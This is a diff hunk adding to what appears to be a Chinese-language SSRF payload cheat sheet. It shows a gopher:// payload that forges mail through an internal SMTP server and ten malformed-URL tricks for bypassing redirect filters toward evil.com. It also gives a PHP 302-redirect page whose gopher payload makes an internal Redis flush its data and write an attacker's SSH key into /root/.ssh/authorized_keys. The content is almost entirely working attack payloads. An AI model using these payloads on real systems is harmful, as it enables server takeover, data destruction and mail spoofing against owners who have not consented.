@@ -798,6 +798,46 @@ Gopher://
 ssrf.php?url=gopher://127.0.0.1:25/_HELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
 ```
 
+## 畸形地址绕过
+
+1. 单斜线”/“绕过
+
+`https://www.landgrey.me/redirect.php?url=/www.evil.com`
+
+2. 缺少协议绕过
+
+`https://www.landgrey.me/redirect.php?url=//www.evil.com`
+
+3. 多斜线”/“前缀绕过
+   `https://www.landgrey.me/redirect.php?url=///www.evil.com https://www.landgrey.me/redirect.php?url=////www.evil.com`
+4. 利⽤”@”符号绕过
+   `https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com`
+5. 利⽤反斜线”"绕过
+   `https://www.landgrey.me/redirect.php?url=https://www.evil.com\www.landgrey.me`
+6. 利⽤”#”符号绕过
+   `https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me`
+7. 利⽤”?”号绕过
+   `https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me`
+8. 利⽤”\“绕过
+   `https://www.landgrey.me/redirect.php?url=https://www.evil.com\\www.landgrey.me`
+9. 利⽤”.”绕过
+   `https://www.landgrey.me/redirect.php?url=.evil (可能会跳转到www.landgrey.me.evil域名)`
+   `https://www.landgrey.me/redirect.php?url=.evil.com (可能会跳转到evil.com域名)`
+10. 重复特殊字符绕过
+    `https://www.landgrey.me/redirect.php?url=///www.evil.com//.. https://www.landgrey.me/redirect.php?url=////www.evil.com//..`
+
+## 302跳转
+
+在服务器上设置一个302跳转的页面，跳转到需要解析到host
+
+```
+<?php
+header("Location: gopher://127.0.0.1:6379/_*1%0d%0A%248%0d%0Aflushall%0d%0A*3%0d%0A%243%0d%0Aset%0d%0A%241%0d%0A1%0d%0A%24567%0d%0A%0A%0Assh-rsa%20AAAAB3NzaC1yc2EAAAADAQABAAABgQCw4Mu9RfSGYhyF8a7yS87Sna0zGZePbVjr89h8TFOuNUTj2sDkSNgWaPFbDcLdGIuXcAynlDmzwJSCDCDi7ZEPZjUWkC09tFZm+c/lsdX4nHncF+WpnDmkt5WWu+VziuCDrgtVgmDIs4dVILQckDF9qLRWygSjGiAfd0NFIa2Di1BhDtNkgF599fZATuujOISw0muP4tm6dUhE4lKzMpaIZmnLmzQBT4+BIv38ZkObtGnn1diXj+879y5cM2ifT+dRdbTmFJ8bApzABS93sWvtHfM+4vctZm0bL+2KtTOKzqQM5Yuc/5XvsjsI4zPha79/8cOg6t/oGu8b4BXcLMatMBALnyOUitlfZbI1b101htkn5hHbe1sebxVDFgL7wF4yL4l//OBvqhUzg7ZxJ7E1UkkzwsKTn4QlYp3YGXeQUW5HclcHn/+Vw7xLzXD2NjhxKXDfo2MO/d+mx5IGQrdFOaBlE53ZNgcV0UH0MYhOc8Axz3sv3SZstmEASlIL/BE=%20root@kali%0A%0A%0A%0d%0A*4%0d%0A%246%0d%0Aconfig%0d%0A%243%0d%0Aset%0d%0A%243%0d%0Adir%0d%0A%2411%0d%0A/root/.ssh/%0d%0A*4%0d%0A%246%0d%0Aconfig%0d%0A%243%0d%0Aset%0d%0A%2410%0d%0Adbfilename%0d%0A%2415%0d%0Aauthorized_keys%0d%0A*1%0d%0A%244%0d%0Asave%0d%0A");
+?>
+```
+
+
+
 参考链接:
 
 https://xz.aliyun.com/t/6993
